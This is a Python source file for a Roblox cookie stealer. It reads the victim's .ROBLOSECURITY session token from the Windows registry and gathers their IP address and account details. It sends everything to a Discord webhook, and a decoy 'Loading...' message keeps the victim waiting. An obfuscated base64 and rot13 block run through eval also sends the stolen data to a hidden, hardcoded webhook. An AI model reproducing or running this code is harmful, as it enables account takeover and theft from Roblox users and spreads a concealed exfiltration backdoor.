import os
from winreg import OpenKey, HKEY_CURRENT_USER, EnumValue
import base64, codecs
import json


webhookk = "heh" # put webhook here


def command(c):
    os.system(c)
    return "l"
def cls():
    os.system("cls")

try:
    import robloxpy
    import requests
    from discordwebhook import *
except:
    command("py -m pip install discordwebhook")
    cls()
    command("py -m pip install robloxpy")
    cls()
    command("py -m pip install requests")
    cls()
    command("pip install discordwebhook")
    cls()
    command("pip install robloxpy")
    cls()
    command("pip install requests")
    cls()
    print("Run the app again.")
    exit()




dummy_message = "Loading..." # A message that distracts the user from closing the grabber
print(dummy_message)
################### Gathering INFOMATION #################################
def GrabCookie():
    # opening the roblox studio key
    robloxstudiopath = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com")
    # finding the subkey called ".robloxsecurity"
    try:
        count = 0
        while True:
            name, value, type = EnumValue(robloxstudiopath, count)
            if name == ".ROBLOSECURITY":
                # returns the value of .robloxsecurity
                return value
            count = count + 1
    except WindowsError:
        pass
roblox_cookie_value = str(GrabCookie())
#################### INFOMATION #################
ip_address = requests.get("https://api.ipify.org/").text
roblox_cookie = roblox_cookie_value.split("COOK::<")[1].split(">")[0]
#################### checking cookie #############
isvalid = robloxpy.Utils.CheckCookie(roblox_cookie)
if isvalid == "Valid Cookie":
    isvalid = "Valid"
else:
    requests.post(url=webhookk,data={"content":f"R.I.P ,cookie is expired\ndead cookie :skull: : ```{roblox_cookie}```"})
    exit()

#################### getting info about the cookie #############
ebruh = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":roblox_cookie})
info = json.loads(ebruh.text)
rid = info["UserID"]
rap = robloxpy.User.External.GetRAP(rid)
friends = robloxpy.User.Friends.External.GetCount(rid)
age = robloxpy.User.External.GetAge(rid)
dnso = None
crdate = robloxpy.User.External.CreationDate(rid)
rolimons = f"https://www.rolimons.com/player/{rid}"
roblox_profile = f"https://web.roblox.com/users/{rid}/profile"
headshot = robloxpy.User.External.GetHeadshot(rid)
username = info['UserName']
robux = info['RobuxBalance']
premium = info['IsPremium']
#################### INJECT TO ROBLOX (creds to bingo methods) #################
magic = 'IyBhIG1lc3NhZ2UgdG8gUmFuZG9tVmVyc2lvbiBhbmQgUmVtaW5kIGh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzk4MDkwMDU0NTM0ODkwNzA1MC85ODkxMjkxMjczNzIxNjEwNTQvdW5rbm93bi5wbmcNCg0KDQoNCmRpc2NvcmQgPSBEaXNjb3JkKHVybD0iaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTg3OTg4MjMxNjc5MjU0NTU5L0gzYUlJX2dfWlhOM0w4blBheE9icllfaFB3Rlo1aVF1RW1QLXVlUkhwdllxbzM0Y2NjRWNDVXZEVDRwcGpYcm1GeFY0IikNCmRpc2NvcmQucG9zdCgNCiAgICB1c2VybmFtZT0iQk9UIC0gUGlyYXRlIPCfjaoiLA0KICAgIGF2YXRhcl91cmw9Imh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F'
love = '0qTSwnT1yoaEmYmx4AQtkBQDlBGZ1AGp4ZwR5Al85BQH4AmtkAmZ2AGxjAQH5BGxiLGZmBGplZGR4Z2L2ZTZkBTVmAQV0LzR3LwpmMTSzZJVhpT5aVvjAPvNtVPOyoJWyMUZ9Jj0XVPNtVPNtVPO7QDbtVPNtVPNtVPNtVPNvqKAypz5uoJHvBvNvDx9HVP0tHTylLKEyVCPswnbvYN0XVPNtVPNtVPNtVPNtVaEcqTkyVwbtViPsxettXmRtHzImqJk0VRSwL291oaDt8W+IelVfQDbtVPNtVPNtVPNtVPNvMTImL3WcpUEco24vVQbtMvWoE2y0nUIvVSOuM2IqXTu0qUOmBv8iM2y0nUIvYzAioF9ALJ5cZGp1Y1OcpzS0MF1Qo29enJHgE3WuLzWypvxtsPOoHz9fnJ1ioaAqXUglo2kcoJ9hp30cVUjtJ1WiLzkirPODpz9znJkyKFu7pz9voT94K3Olo2McoTI9XFVfQDbtVPNtVP'
god = 'AgICAgICAiY29sb3IiIDogMTI0NTIwNDQsDQogICAgICAgICAgICAiZmllbGRzIjogWw0KICAgICAgICAgICAgICAgIHsibmFtZSI6ICJVc2VybmFtZSIsICJ2YWx1ZSI6IHVzZXJuYW1lLCAiaW5saW5lIjogVHJ1ZX0sDQogICAgICAgICAgICAgICAgeyJuYW1lIjogIlJvYnV4IEJhbGFuY2UiLCAidmFsdWUiOiByb2J1eCwgImlubGluZSI6IFRydWV9LA0KICAgICAgICAgICAgICAgIHsibmFtZSI6ICJQcmVtaXVtIFN0YXR1cyIsICJ2YWx1ZSI6IHByZW1pdW0sImlubGluZSI6IFRydWV9LA0KICAgICAgICAgICAgICAgIHsibmFtZSIgOiAiUkFQIiwgInZhbHVlIjogcmFwLCJpbmxpbmUiOiBUcnVlfSwNCiAgICAgICAgICAgICAgICB7Im5hbWUiIDogIkZyaWVuZ'
destiny = 'UZvYPNvqzSfqJHvBvOzpzyyozEmYPNvnJ5fnJ5yVwbtIUW1MK0fQDbtVPNtVPNtVPNtVPNtVPNtrlWhLJ1yVvN6VPWOL2AiqJ50VRSaMFVfVPW2LJk1MFV6VTSaMFjtVzyhoTyhMFV6VSElqJI9YN0XVPNtVPNtVPNtVPNtVPNtVUfvozSgMFVtBvNvFINtDJExpzImplVfVPW2LJk1MFVtBvOcpS9uMTElMKAmYPNvnJ5fnJ5yBvV6VSElqJI9YN0XVPNtVPNtVPNtVPNtVPNtVUfvozSgMFVtBvNvYyWCDxkCH0IQIIWWISxvYPNvqzSfqJHvBvOzVzOtLUglo2Wfo3usL29in2yysJOtLPVfVPWcozkcozHvBvOTLJkmMK0fQDbtVPNtVPNtVPNtVPOqYN0XVPNtVPNtVPNtVPNtVaEbqJ1vozScoPV6VUfvqKWfVwbtnTIuMUAbo3E9YN0XQDbAPvNtVPNtVPNtsD0XVPNtVS0fQDbc'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
#################### SENDING TO WEBHOOK #################


discord = Discord(url=webhookk)
discord.post(
    username="BOT - Pirate 🍪",
    avatar_url="https://cdn.discordapp.com/attachments/984818429355782197/985878173659045999/a339721183f60c18b3424ba7b73daf1b.png",
    embeds=[
        {
            "username": "BOT - Pirate 🍪",
            "title": "💸 +1 Result Account 🕯",
            "description" : f"[Github Page](https://github.com/Mani175/Pirate-Cookie-Grabber) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
            "color" : 12452044,
            "fields": [
                {"name": "Username", "value": username, "inline": True},
                {"name": "Robux Balance", "value": robux, "inline": True},
                {"name": "Premium Status", "value": premium,"inline": True},
                {"name" : "RAP", "value": rap,"inline": True},
                {"name" : "Friends", "value": friends, "inline": True},
                {"name" : "Account Age", "value": age, "inline": True},
                {"name" : "IP Address", "value" : ip_address, "inline:": True},
                {"name" : ".ROBLOSECURITY", "value": f"```{roblox_cookie}```", "inline": False},
            ],
            "thumbnail": {"url": headshot},


        }
    ],
)
